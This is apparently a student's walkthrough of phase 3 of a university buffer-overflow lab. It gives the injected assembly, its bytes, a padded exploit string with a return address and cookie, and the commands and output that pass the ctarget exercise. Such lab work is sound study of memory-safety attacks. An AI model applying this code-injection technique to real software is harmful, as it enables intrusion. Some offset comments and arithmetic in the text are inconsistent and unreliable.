Phase 3 is kinda similar to phase to except that we are trying to call the function touch3 and have to pass our cookie to it as string

In the instruction it tells you that if you store the cookie in the buffer allocated for getbuf, the functions hexmatch and strncmp
may overwrite it as they will be pushing data on to the stack, so you have to be careful where you store it.

We will be storing the cookie after touch3.

So let's pass the address for the cookie to register $rdi

The total bytes before the cookie are `buffer + 8 bytes for return address of rsp + 8 bytes for touch3` 

`0x18 + 8 + 8 =  28` (40 Decimal)  

Grab the address for rsp from phase 2: `0x55620cd8`
Add 0x28
`0x55620cd8 + 0x28 = 0x55620D00`
Now you need this assembly code, same steps generating the byte representation

```
    movq $0x55620D00,%rdi /* %rsp + 0x18 */
    retq
```

The byte representation is as follows:
```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 00 0d 62 55 	mov    $0x55620d00,%rdi
   7:	c3                   	retq   
```

Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named phase3.txt and here is what mine looks like:
```
48 c7 c7 00 0d 62 55 c3 /*rsp + 28 the address where the cookie is present*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /*padding*/
d8 0c 62 55 00 00 00 00 /* return address *
7f 19 40 00 00 00 00 00 /* touch3 address -- get this from the rtarget dump file */
34 33 34 62 34 62 37 30 /* cookie string*/
```
If you look at the last row above, the cookie is in hex format, so you need to take your cookie and convert in to text format.
Go to http://www.unit-conversion.info/texttools/hexadecimal/ and put in your cookie without '0x' and it should give you the text format or you could look up ascii equivalent on your machine


Last step is to generate the raw eploit string using the hex2raw program.

`./hex2raw < phase3.txt > raw-phase3.txt`

Finally, you run the raw file

`./ctarget < raw-phase3.txt`

Response looks like below

```
Cookie: 0x434b4b70
Type string:Touch3!: You called touch3("434b4b70")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
